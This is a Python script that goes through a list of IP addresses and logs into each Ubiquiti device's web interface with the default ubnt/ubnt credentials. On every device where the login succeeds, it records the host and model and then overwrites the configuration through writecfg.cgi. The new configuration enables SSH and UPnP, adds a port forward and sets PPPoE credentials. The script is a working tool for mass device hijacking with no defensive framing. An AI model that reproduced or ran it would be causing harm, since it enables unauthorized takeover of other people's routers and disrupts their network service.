import requests, time

file1 = open('lol.txt', 'r')
Lines = file1.readlines()


headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
}

data = {
    'uri': '',
    'username': 'ubnt',
    'password': 'ubnt',
    'login': 'Login',
}

session = requests.session()

for line in Lines:
    lol = line[:-1]
    try:
        response = session.post(f'http://{lol}/login.html', headers=headers, data=data, verify=False)
        #response = requests.post('http://134.195.118.81/login.html', headers=headers, data=data, verify=False)
        #print(response)
        if b'<!doctype html>\n<html>\n    <head>\n        <meta charset="utf-8"/>\n' in response.content:
            #print("Login Failed")
            pass
        elif b'<!doctype html>\n<!--[if IE 9 ]><html class="ie9"> <![endif]-->\n<!--[if (gt IE 9)' in response.content:
            my_cookies = requests.utils.dict_from_cookiejar(session.cookies)        
            #print(my_cookies)
            cook = my_cookies['si']
            #print(cook)
            print(lol)
            cookies = {
                'si': cook,
            }

            headers2 = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en',
                'Connection': 'keep-alive',
                'Cookie': f'si={cook}',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
            }


            params = {
                '_': '1681404694763',
            }

            r2 = session.get(f'http://{lol}/status.cgi', params=params, cookies=cookies, headers=headers2, verify=False, timeout=4)
            #print(r2.content)
            #print(r2.json())
            
            response_json = r2.json()
            model = response_json['device']['model']
            print(model)
            with open("all.txt","a") as f:
                f.write(f"{lol}:{model}\n")
            config = 'resolv.host.1.name=psf vila nunes\r\nusers.current.name=ubnt\r\nnetworkmode.id=2\r\nhttpd.port=80\r\ntelnetd.status=0\r\ntelnetd.port=23\r\nsshd.status=1\r\nsshd.port=22\r\ndiscovery.status=1\r\nwan.type=2\r\nwan.pppoe.name=pmcr-psf-vnunes\r\nwan.pppoe.password=pmcr-psf-vnunes\r\nwan.pppoe.mode=0\r\nwan.vlanid=450\r\nwan.blockManagement=0\r\nnat.conntrack.ftp=1\r\nnat.conntrack.pptp=1\r\nnat.conntrack.rtsp=1\r\nnat.conntrack.sip=1\r\nlan.ip=192.168.0.3\r\nlan.netmask=255.255.252.0\r\nlan1.speed=0\r\ndhcpserver.enable=1\r\ndhcpserver.begin=192.168.0.10\r\ndhcpserver.end=192.168.3.250\r\ndhcpserver.lease=600\r\ndhcpserver.netmask=255.255.252.0\r\ndhcpserver.dnsproxy=1\r\noltvendor.id=1\r\noltvendor.disableLanConfig=1\r\noltauth.password=          \r\noltauth.passwordHexSwitch=0\r\noltauth.loid.username=ubnt\r\noltauth.loid.password=ubntubnt\r\ngpon.snprefix.status=0\r\nupnp.status=1\r\nportfw.1.enable=1\r\nportfw.1.protocol=tcp\r\nportfw.1.lanIp=192.168.10.10\r\nportfw.1.lanPort=8080\r\nportfw.1.wanPort=8080\r\nportfw.1.comment=ROTEADOR\r\nupdate.check.status=1'

            r3 = requests.post(f'http://{lol}/writecfg.cgi', cookies=cookies, headers=headers, data=config, verify=False)
            print(r3.content)
            #print(a[2])
            #model = r2['device']
            #print(model)
        else:
            #print("Unknown")
            pass
    except Exception as e:
        pass

